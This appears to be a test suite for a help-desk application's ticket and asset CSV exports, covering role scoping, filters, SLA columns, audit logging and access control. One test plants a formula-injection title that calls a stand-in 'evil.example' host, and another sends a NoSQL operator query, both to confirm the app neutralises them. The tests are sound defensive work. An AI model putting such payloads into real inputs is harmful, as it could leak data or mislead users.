// Report preview and CSV exports on the real seed: scope, filters, quoting, formula injection,
// internal notes, the audit trail. Expected numbers come from the table in utils/demoTickets.js.
import { test, describe, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { bootApp, loginAs } from '../../testkit/boot.js'
import { parseCsv } from '../../testkit/helpers.js'

const HEADER = ['Ticket ID', 'Title', 'Type', 'Category', 'Team', 'Priority', 'Status', 'Requester', 'Assigned to', 'Created (IST)', 'First response (IST)', 'Resolved (IST)', 'Closed (IST)', 'Response due (IST)', 'Resolution due (IST)', 'Response SLA', 'Resolution SLA', 'Reopened', 'CSAT', 'Close reason']

describe('reports and CSV export (real database)', () => {
  let ctx, admin, mia, ian, theo, emp, assets
  const csv = async (agent, query = '') => {
    const res = await agent.get(`/report-api/tickets.csv${query}`).buffer(true).parse((r, cb) => { let d = ''; r.setEncoding('utf8'); r.on('data', (c) => (d += c)); r.on('end', () => cb(null, d)) })
    return { res, text: res.body, rows: res.status === 200 ? parseCsv(res.body) : null }
  }
  const col = (rows, name) => rows.slice(1).map((r) => r[rows[0].indexOf(name)])

  before(async () => {
    ctx = await bootApp({}, { fixtures: false })
    const { seedIfEmpty } = await import('../../utils/seedData.js')
    await seedIfEmpty()
    ;[admin, mia, ian, theo, emp, assets] = await Promise.all(
      ['admin@sdp.test', 'manager@sdp.test', 'ian@sdp.test', 'tech@sdp.test', 'employee@sdp.test', 'assets@sdp.test'].map((e) => loginAs(ctx.app, e)),
    )
  })
  after(() => ctx.stop())

  test('Manager CSV: only their team, the agreed columns, readable download headers', async () => {
    const { res, text, rows } = await csv(mia)
    assert.equal(res.status, 200)
    assert.match(res.headers['content-type'], /^text\/csv; charset=utf-8/)
    assert.match(res.headers['content-disposition'], /^attachment; filename="tickets-\d{4}-\d{2}-\d{2}\.csv"$/)
    assert.equal(res.headers['cache-control'], 'no-store')
    assert.equal(res.headers['x-row-count'], '28')
    assert.equal(res.headers['x-truncated'], 'false')
    assert.ok(text.startsWith('﻿'), 'starts with a BOM so Excel reads UTF-8')
    assert.deepEqual(rows[0], HEADER)
    assert.equal(rows.length, 29) // header + 28
    assert.ok(rows.every((r) => r.length === HEADER.length), 'every row has every column')
    assert.deepEqual([...new Set(col(rows, 'Team'))], ['Service Desk'])
    // newest first
    const created = col(rows, 'Created (IST)')
    assert.deepEqual(created, [...created].sort().reverse())
  })

  test('Infrastructure manager and Admin get their own scope', async () => {
    assert.equal((await csv(ian)).rows.length, 13) // 12 + header
    assert.equal((await csv(admin)).rows.length, 41)
    const inf = await csv(admin, '?department=' + (await ian.get('/manager-api/dashboard')).body.payload.scope.department._id)
    assert.equal(inf.rows.length, 13)
    // a Manager passing someone else's department cannot widen their scope
    const dept = (await ian.get('/manager-api/dashboard')).body.payload.scope.department._id
    assert.equal((await csv(mia, `?department=${dept}`)).rows.length, 29)
  })

  test('filters narrow the result; the preview total matches the CSV rows', async () => {
    const closed = await csv(admin, '?status=CLOSED')
    assert.equal(closed.rows.length - 1, 17)
    assert.deepEqual([...new Set(col(closed.rows, 'Status'))], ['CLOSED'])
    const critical = await csv(admin, '?priority=CRITICAL')
    assert.deepEqual([...new Set(col(critical.rows, 'Priority'))], ['CRITICAL'])
    const preview = (await admin.get('/report-api/tickets?status=CLOSED&limit=5')).body.payload
    assert.equal(preview.total, 17)
    assert.equal(preview.items.length, 5)
    assert.equal(preview.totalPages, 4)
    assert.equal(preview.exportRows, 17)
    assert.equal(preview.exportCap, 5000)
    // dates: everything was created within the last 60 days, nothing "from tomorrow"
    const tomorrow = new Date(Date.now() + 36 * 3600000).toISOString().slice(0, 10)
    assert.equal((await csv(admin, `?from=${tomorrow}`)).rows.length, 1)
    const longAgo = '2020-01-01'
    assert.equal((await csv(admin, `?from=${longAgo}&to=${longAgo}`)).rows.length, 1)
    assert.equal((await csv(admin, '?from=2020-01-01')).rows.length, 41)
  })

  test('a day range uses whole IST days and includes the "to" day', async () => {
    const { TicketModel } = await import('../../models/TicketModel.js')
    const t = await TicketModel.findOne({ title: 'Webcam is not detected' })
    const istDay = new Date(t.createdAt.getTime() + 330 * 60000).toISOString().slice(0, 10)
    const one = await csv(admin, `?from=${istDay}&to=${istDay}`)
    assert.ok(col(one.rows, 'Title').includes('Webcam is not detected'))
    const dayAfter = new Date(new Date(istDay).getTime() + 86400000).toISOString().slice(0, 10)
    assert.ok(!col((await csv(admin, `?from=${dayAfter}`)).rows, 'Title').includes('Webcam is not detected'))
  })

  test('bad filters are a 400, never a 500', async () => {
    for (const q of ['?from=yesterday', '?to=2026-13-01', '?from=2026-02-30', '?from=2026-10-05&to=2026-10-01', '?department=nope']) {
      const res = await admin.get(`/report-api/tickets.csv${q}`)
      assert.equal(res.status, 400, q)
      assert.equal((await admin.get(`/report-api/tickets${q}`)).status, 400, q)
    }
    // an array or object where text is expected counts as "no filter" (the rule every list route in this project follows)
    assert.equal((await admin.get('/report-api/tickets.csv?from=2026-10-01&from=2026-10-02')).status, 200)
    assert.equal((await admin.get('/report-api/tickets.csv?status=CLOSED&status=OPEN')).status, 200)
    assert.equal((await admin.get('/report-api/tickets.csv?status[$ne]=CLOSED')).status, 200)
  })

  test('SLA columns follow the table: late reply and late resolution are marked', async () => {
    const { rows } = await csv(admin, '?status=CLOSED')
    const byTitle = new Map(rows.slice(1).map((r) => [r[1], r]))
    const sla = (title) => [byTitle.get(title)[rows[0].indexOf('Response SLA')], byTitle.get(title)[rows[0].indexOf('Resolution SLA')]]
    assert.deepEqual(sla('Laptop will not power on after update'), ['Met', 'Met'])
    assert.deepEqual(sla('Excel crashes when opening the shared workbook'), ['Missed', 'Missed'])
    assert.deepEqual(sla('Docking station not charging the laptop'), ['Met', 'Missed'])
    assert.deepEqual(sla('Cannot reach the intranet from the branch office'), ['Met', 'Met']) // resolved exactly on the deadline
    assert.equal(byTitle.get('Laptop will not power on after update')[rows[0].indexOf('CSAT')], '5')
    assert.equal(byTitle.get('New hardware: wireless keyboard and mouse')[rows[0].indexOf('CSAT')], '') // never rated
    assert.equal(byTitle.get('Laptop will not power on after update')[rows[0].indexOf('Close reason')], 'CONFIRMED')
  })

  test('titles that look like formulas are neutralised, and quotes and commas survive', async () => {
    const category = (await ctx.app && (await (await import('../../models/CategoryModel.js')).CategoryModel.findOne({ name: 'Hardware' })))
    const evil = '=HYPERLINK("http://evil.example/steal","click"), please'
    const made = await emp.post('/ticket-api/tickets').send({ title: evil, description: 'formula injection check', categoryId: String(category._id) })
    assert.equal(made.status, 201)
    const { rows, text } = await csv(admin)
    const cell = col(rows, 'Title').find((t) => t.includes('evil.example'))
    assert.equal(cell, `'${evil}`) // parsed back: a leading quote, the rest untouched
    assert.ok(!/(^|,)=HYPERLINK/m.test(text), 'no cell starts with =')
    // a plus sign and an at sign too
    for (const [title, expected] of [['+1 call me', "'+1 call me"], ['@SUM(1+1)', "'@SUM(1+1)"]]) {
      await emp.post('/ticket-api/tickets').send({ title, description: 'x', categoryId: String(category._id) })
      assert.ok(col((await csv(admin)).rows, 'Title').includes(expected), title)
    }
  })

  test('internal notes and AI notes never reach the export or the preview', async () => {
    const { TicketModel } = await import('../../models/TicketModel.js')
    const t = await TicketModel.findOne({ title: 'Webcam is not detected' })
    const note = await mia.post(`/ticket-api/tickets/${t.publicId}/comments`).send({ text: 'INTERNAL-SECRET-4471 suspect the cable', isInternal: true })
    assert.equal(note.status, 201)
    await TicketModel.updateOne({ _id: t._id }, { $set: { 'ai.probableIssue': 'AI-NOTE-9921' } })
    const { text } = await csv(admin)
    assert.ok(!text.includes('INTERNAL-SECRET-4471') && !text.includes('AI-NOTE-9921'))
    const preview = JSON.stringify((await admin.get('/report-api/tickets?limit=50')).body)
    assert.ok(!preview.includes('INTERNAL-SECRET-4471') && !preview.includes('AI-NOTE-9921'))
    for (const item of (await admin.get('/report-api/tickets?limit=50')).body.payload.items) {
      assert.equal('comments' in item, false)
      assert.equal('ai' in item, false)
    }
  })

  test('every export leaves an audit entry', async () => {
    const { AuditLogModel } = await import('../../models/AuditLogModel.js')
    const before = await AuditLogModel.countDocuments({ action: 'TICKET_EXPORT' })
    const openForMia = (await mia.get('/ticket-api/tickets?status=OPEN&limit=1')).body.payload.total // what the export should contain
    await csv(mia, '?status=OPEN')
    const entries = await AuditLogModel.find({ action: 'TICKET_EXPORT' }).sort({ createdAt: -1 }).lean()
    assert.equal(entries.length, before + 1)
    assert.equal(entries[0].entityType, 'REPORT')
    assert.equal(entries[0].after.rows, openForMia)
    assert.ok(openForMia >= 2)
    assert.deepEqual(entries[0].after.filters, { status: 'OPEN' })
    assert.ok(entries[0].actor)
  })

  test('only Manager and Admin can export tickets', async () => {
    for (const agent of [theo, emp, assets]) {
      assert.equal((await agent.get('/report-api/tickets.csv')).status, 403)
      assert.equal((await agent.get('/report-api/tickets')).status, 403)
    }
    const anon = (await import('supertest')).default(ctx.app)
    assert.equal((await anon.get('/report-api/tickets.csv')).status, 401)
  })

  test('asset CSV: Asset Manager and Admin only, four seeded assets, status filter validated', async () => {
    const res = await assets.get('/report-api/assets.csv')
    assert.equal(res.status, 200)
    const rows = parseCsv(res.text)
    assert.deepEqual(rows[0], ['Asset ID', 'Name', 'Type', 'Class', 'Status', 'Serial / license', 'Vendor', 'Assigned to', 'Purchase date', 'Purchase cost', 'Warranty expiry', 'Maintenance cost'])
    assert.equal(rows.length, 5)
    assert.ok(col(rows, 'Vendor').includes('Dell Technologies'))
    assert.equal((await assets.get('/report-api/assets.csv?status=IN_REPAIR')).text.split('\r\n').filter(Boolean).length, 2)
    assert.equal((await assets.get('/report-api/assets.csv?status=BOGUS')).status, 400)
    assert.equal((await admin.get('/report-api/assets.csv')).status, 200)
    for (const agent of [mia, theo, emp]) assert.equal((await agent.get('/report-api/assets.csv')).status, 403)
  })
})
